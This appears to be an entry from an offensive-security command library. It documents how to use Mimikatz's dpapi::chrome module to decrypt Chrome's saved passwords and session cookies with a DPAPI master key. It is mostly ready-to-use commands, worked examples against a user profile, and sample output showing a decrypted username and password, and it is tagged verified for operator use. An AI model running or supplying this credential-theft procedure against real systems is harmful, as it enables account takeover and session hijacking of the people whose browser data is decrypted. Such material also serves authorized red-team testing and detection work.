---
id: 91947118-0b60-4d5d-9574-067943d5965a
name: mimikatz-dpapi-chrome-decrypt
type: command
executor: command_prompt
data: >-
  mimikatz.exe


  dpapi::chrome /in:"C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User
  Data\Default\$_FILE_NAME" /unprotect /masterkey:$_MASTER_KEY
output: >-
  C:\Windows\system32\spool\drivers\color>mimikatz.exe

    .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
   .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
   ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
   ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
   '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
    '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

  mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User
  Data\Default\Login Data" /unprotect
  /masterkey:daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723

  > Encrypted Key found in local state file

  > Encrypted Key seems to be protected by DPAPI
   * using CryptUnprotectData API
   * masterkey     : daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723
  > AES Key is: 700c4a9477bf45ac86e53c109511907330a66bad896f3429da96cb70b9afd9f4


  URL     : http://10.10.1.1/ ( http://10.10.1.1/ )

  Username: admin
   * using BCrypt with AES-256-GCM
  Password: S3c47pA55
created_at: '2020-07-21T05:09:20.612670+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - mimikatz
  - dpapi
  - chrome
  - decrypt
verified: true
validated: true
---

# mimikatz-dpapi-chrome-decrypt

## Command

```command_prompt
mimikatz.exe

dpapi::chrome /in:"C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\$_FILE_NAME" /unprotect /masterkey:$_MASTER_KEY
```

## Description

This command uses Mimikatz's dpapi::chrome module to decrypt Chrome's encrypted cookies or credentials files using a provided master key. Specify the input file as 'Login Data' for credentials or 'Cookies' for session cookies; run interactively after launching Mimikatz.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /in:$_FILE_PATH | Path to the Chrome SQLite file (e.g., Login Data or Cookies) | Yes |
| /unprotect | Attempt DPAPI unprotection using the master key | Yes |
| /masterkey:$_MASTER_KEY | Hex string of the DPAPI master key from memory dump | Yes |

## Examples

### Basic Usage for Credentials

```command_prompt
mimikatz.exe

dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect /masterkey:daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723
```

### Usage for Cookies

Replace /in path with Cookies file:

```command_prompt
mimikatz.exe

dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /unprotect /masterkey:daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723
```

## Expected Output

Mimikatz banner, then decryption details:

```
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
 * masterkey     : daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723
> AES Key is: 700c4a9477bf45ac86e53c109511907330a66bad896f3429da96cb70b9afd9f4

URL     : http://10.10.1.1/ ( http://10.10.1.1/ )
Username: admin
 * using BCrypt with AES-256-GCM
Password: S3c47pA55
```

For cookies, output includes host, name, and value fields in plaintext.

## Related

- [[procedures/Extract-Chrome-Cookies-and-Credentials-from-Logged-in-User-Profile]]
- [[tools/Mimikatz]]
